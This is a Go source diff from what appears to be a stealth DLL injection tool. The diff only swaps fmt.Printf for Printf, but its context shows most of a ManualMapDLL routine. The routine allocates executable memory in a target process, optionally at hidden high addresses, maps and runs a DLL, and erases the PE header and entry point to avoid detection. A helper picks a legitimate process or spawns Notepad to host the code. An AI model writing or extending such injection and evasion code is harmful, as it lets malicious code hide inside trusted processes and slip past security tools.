@@ -90,7 +90,7 @@ func ManualMapDLL(processID uint32, dllBytes []byte, options BypassOptions) erro
 		return fmt.Errorf("DLL data cannot be empty")
 	}
 
-	fmt.Printf("Starting manual mapping of DLL to process ID: %d, DLL size: %d bytes, using invisible memory: %v\n",
+	Printf("Starting manual mapping of DLL to process ID: %d, DLL size: %d bytes, using invisible memory: %v\n",
 		processID, len(dllBytes), options.InvisibleMemory)
 
 	// 打开目标进程
@@ -102,7 +102,7 @@ func ManualMapDLL(processID uint32, dllBytes []byte, options BypassOptions) erro
 	}
 	defer windows.CloseHandle(hProcess)
 
-	fmt.Printf("Successfully opened target process\n")
+	Printf("Successfully opened target process\n")
 
 	// 解析PE头
 	peHeader, err := ParsePEHeader(dllBytes)
@@ -110,7 +110,7 @@ func ManualMapDLL(processID uint32, dllBytes []byte, options BypassOptions) erro
 		return fmt.Errorf("Failed to parse PE header: %v", err)
 	}
 
-	fmt.Printf("Successfully parsed PE header, image size: %d bytes\n", peHeader.OptionalHeader.SizeOfImage)
+	Printf("Successfully parsed PE header, image size: %d bytes\n", peHeader.OptionalHeader.SizeOfImage)
 
 	// 计算需要分配的内存大小
 	imageSize := peHeader.OptionalHeader.SizeOfImage
@@ -122,7 +122,7 @@ func ManualMapDLL(processID uint32, dllBytes []byte, options BypassOptions) erro
 	if options.InvisibleMemory {
 		// 尝试在高地址空间分配内存，如果失败则尝试让系统自动选择地址
 		// 使用几个不同的高地址尝试
-		fmt.Printf("Attempting to allocate invisible memory in high address space...\n")
+		Printf("Attempting to allocate invisible memory in high address space...\n")
 
 		// 获取适合当前架构的高地址
 		var highAddresses []uintptr
@@ -146,33 +146,33 @@ func ManualMapDLL(processID uint32, dllBytes []byte, options BypassOptions) erro
 		}
 
 		for _, addr := range highAddresses {
-			fmt.Printf("Trying to allocate memory at address 0x%X...\n", addr)
+			Printf("Trying to allocate memory at address 0x%X...\n", addr)
 			baseAddress, memAllocErr = VirtualAllocEx(hProcess, addr, uintptr(imageSize),
 				windows.MEM_RESERVE|windows.MEM_COMMIT, windows.PAGE_EXECUTE_READWRITE)
 			if memAllocErr == nil {
-				fmt.Printf("Successfully allocated memory at address 0x%X\n", baseAddress)
+				Printf("Successfully allocated memory at address 0x%X\n", baseAddress)
 				break // 成功分配了内存
 			}
-			fmt.Printf("Failed to allocate at 0x%X: %v\n", addr, memAllocErr)
+			Printf("Failed to allocate at 0x%X: %v\n", addr, memAllocErr)
 		}
 
 		// 如果所有高地址都失败，尝试让系统自动选择
 		if memAllocErr != nil {
-			fmt.Printf("Failed to allocate memory in high address space, letting system choose address...\n")
+			Printf("Failed to allocate memory in high address space, letting system choose address...\n")
 			baseAddress, err = VirtualAllocEx(hProcess, 0, uintptr(imageSize),
 				windows.MEM_RESERVE|windows.MEM_COMMIT, windows.PAGE_EXECUTE_READWRITE)
 			if err != nil {
 				return fmt.Errorf("Failed to allocate memory in target process: %v", err)
 			}
-			fmt.Printf("System selected address: 0x%X\n", baseAddress)
+			Printf("System selected address: 0x%X\n", baseAddress)
 		}
 	} else {
 		// 正常分配内存，让系统自动选择地址
-		fmt.Printf("Letting system choose memory address...\n")
+		Printf("Letting system choose memory address...\n")
 
 		// 添加详细的调试信息
-		fmt.Printf("Process handle: 0x%X\n", hProcess)
-		fmt.Printf("Image size: %d bytes (0x%X)\n", imageSize, imageSize)
+		Printf("Process handle: 0x%X\n", hProcess)
+		Printf("Image size: %d bytes (0x%X)\n", imageSize, imageSize)
 
 		// 验证imageSize是否合理
 		if imageSize == 0 {
@@ -187,65 +187,65 @@ func ManualMapDLL(processID uint32, dllBytes []byte, options BypassOptions) erro
 		if err != nil {
 			return fmt.Errorf("Failed to allocate memory in target process (size: %d): %v", imageSize, err)
 		}
-		fmt.Printf("System allocated memory at address: 0x%X\n", baseAddress)
+		Printf("System allocated memory at address: 0x%X\n", baseAddress)
 	}
 
 	// 映射PE文件各节到远程进程内存
-	fmt.Printf("Starting to map PE sections to remote process memory...\n")
+	Printf("Starting to map PE sections to remote process memory...\n")
 	err = MapSections(hProcess, dllBytes, baseAddress, peHeader)
 	if err != nil {
 		return fmt.Errorf("Failed to map PE sections: %v", err)
 	}
-	fmt.Printf("Successfully mapped PE sections\n")
+	Printf("Successfully mapped PE sections\n")
 
 	// 修复导入表
-	fmt.Printf("Starting to fix import table...\n")
+	Printf("Starting to fix import table...\n")
 	err = FixImports(hProcess, baseAddress, peHeader)
 	if err != nil {
 		return fmt.Errorf("Failed to fix import table: %v", err)
 	}
-	fmt.Printf("Successfully fixed import table\n")
+	Printf("Successfully fixed import table\n")
 
 	// 修复重定位
-	fmt.Printf("Starting to fix relocations...\n")
+	Printf("Starting to fix relocations...\n")
 	err = FixRelocations(hProcess, baseAddress, peHeader)
 	if err != nil {
 		return fmt.Errorf("Failed to fix relocations: %v", err)
 	}
-	fmt.Printf("Successfully fixed relocations\n")
+	Printf("Successfully fixed relocations\n")
 
 	// 执行DLL入口点
-	fmt.Printf("Starting to execute DLL entry point...\n")
+	Printf("Starting to execute DLL entry point...\n")
 	err = ExecuteDllEntry(hProcess, baseAddress, peHeader)
 	if err != nil {
 		return fmt.Errorf("Failed to execute DLL entry point: %v", err)
 	}
-	fmt.Printf("Successfully executed DLL entry point\n")
+	Printf("Successfully executed DLL entry point\n")
 
 	// 应用反检测技术
 	if options.ErasePEHeader {
-		fmt.Printf("Erasing PE header for stealth...\n")
+		Printf("Erasing PE header for stealth...\n")
 		err = ErasePEHeader(hProcess, baseAddress)
 		if err != nil {
-			fmt.Printf("Warning: Failed to erase PE header: %v\n", err)
+			Printf("Warning: Failed to erase PE header: %v\n", err)
 			// 不返回错误，因为这不是关键操作
 		} else {
-			fmt.Printf("Successfully erased PE header\n")
+			Printf("Successfully erased PE header\n")
 		}
 	}
 
 	if options.EraseEntryPoint {
-		fmt.Printf("Erasing entry point for stealth...\n")
+		Printf("Erasing entry point for stealth...\n")
 		err = EraseEntryPoint(hProcess, baseAddress)
 		if err != nil {
-			fmt.Printf("Warning: Failed to erase entry point: %v\n", err)
+			Printf("Warning: Failed to erase entry point: %v\n", err)
 			// 不返回错误，因为这不是关键操作
 		} else {
-			fmt.Printf("Successfully erased entry point\n")
+			Printf("Successfully erased entry point\n")
 		}
 	}
 
-	fmt.Printf("Manual mapping of DLL completed, base address: 0x%X\n", baseAddress)
+	Printf("Manual mapping of DLL completed, base address: 0x%X\n", baseAddress)
 	return nil
 }
 
@@ -300,7 +300,7 @@ func FindLegitProcess() (uint32, string, error) {
 					windows.CloseHandle(hProcess)
 					targetPID = processEntry.ProcessID
 					targetName = processName
-					fmt.Printf("Found accessible legitimate process: %s (PID: %d)\n", targetName, targetPID)
+					Printf("Found accessible legitimate process: %s (PID: %d)\n", targetName, targetPID)
 					break
 				}
 				// 如果无法打开进程，继续查找下一个
@@ -319,7 +319,7 @@ func FindLegitProcess() (uint32, string, error) {
 
 	if targetPID == 0 {
 		// 如果找不到现有的合法进程，尝试启动一个新的记事本进程
-		fmt.Println("Could not find accessible legitimate process, trying to start Notepad...")
+		Println("Could not find accessible legitimate process, trying to start Notepad...")
 
 		// 创建记事本进程
 		si := windows.StartupInfo{}
@@ -352,7 +352,7 @@ func FindLegitProcess() (uint32, string, error) {
 
 		targetPID = pi.ProcessId
 		targetName = "notepad.exe"
-		fmt.Printf("Started new Notepad process: PID %d\n", targetPID)
+		Printf("Started new Notepad process: PID %d\n", targetPID)
 	}
 
 	if targetPID == 0 {
